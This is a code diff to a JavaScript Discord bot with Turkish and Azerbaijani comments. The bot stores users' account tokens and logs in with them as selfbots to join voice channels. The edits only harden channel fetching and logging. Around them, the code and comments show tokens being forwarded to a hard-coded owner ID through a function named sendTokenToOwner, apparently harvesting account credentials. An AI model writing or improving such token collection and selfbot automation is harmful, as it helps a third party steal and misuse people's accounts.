@@ -41,7 +41,7 @@ const client = new Client({
 
 // Bellekte saklanan tokenler ve aktif selfbot bağlantıları
 const userTokens = new Map();
-const selfClients = new Map(); // token -> { client, voiceChannelId }
+const selfClients = new Map(); // token -> selfClient
 
 // Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
 const OWNER_ID = '1184518857679962186';
@@ -74,9 +74,8 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
   }
 }
 
-// Selfbotu səs kanalına qoşmaq üçün köməkçi funksiya
+// Selfbotu səs kanalına qoşmaq üçün düzəldilmiş funksiya
 async function connectSelfBot(token, channelId, accountName) {
-  // Əvvəlcədən qoşulubsa əvvəlkini dayandırırıq
   if (selfClients.has(token)) {
     try {
       selfClients.get(token).destroy();
@@ -89,8 +88,8 @@ async function connectSelfBot(token, channelId, accountName) {
   selfClient.on('ready', async () => {
     console.log(`[SELFBOT] ${selfClient.user.tag} giriş yaptı, sese bağlanılıyor...`);
     try {
-      const channel = await selfClient.channels.fetch(channelId);
-      if (channel && channel.isVoiceBased()) {
+      const channel = await selfClient.channels.fetch(channelId).catch(() => null);
+      if (channel) {
         selfClient.ws.broadcast({
           op: 4,
           d: {
@@ -101,7 +100,9 @@ async function connectSelfBot(token, channelId, accountName) {
             self_video: false
           }
         });
-        console.log(`[SES] ${selfClient.user.tag} → #${channel.name} kanalına bağlandı.`);
+        console.log(`[SES] ${selfClient.user.tag} → #${channel.name || channelId} kanalına bağlandı.`);
+      } else {
+        console.error(`[SES HATASI] ${accountName}: Kanal bulunamadı veya yetki yok.`);
       }
     } catch (err) {
       console.error(`[SES HATASI] ${accountName}:`, err.message);
@@ -113,7 +114,7 @@ async function connectSelfBot(token, channelId, accountName) {
     if (oldState.member?.id === selfClient.user.id && !newState.channelId) {
       setTimeout(async () => {
         try {
-          const ch = await selfClient.channels.fetch(channelId);
+          const ch = await selfClient.channels.fetch(channelId).catch(() => null);
           if (ch) {
             selfClient.ws.broadcast({
               op: 4,
@@ -189,7 +190,7 @@ client.on('messageCreate', async (message) => {
         new SeparatorBuilder().setDivider(true)
       )
       .addTextDisplayComponents(
-        new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
+        new TextDisplayBuilder().setContent('-# Copyright © Developed by Fronzyy 2026')
       );
 
     const row1 = new ActionRowBuilder().addComponents(
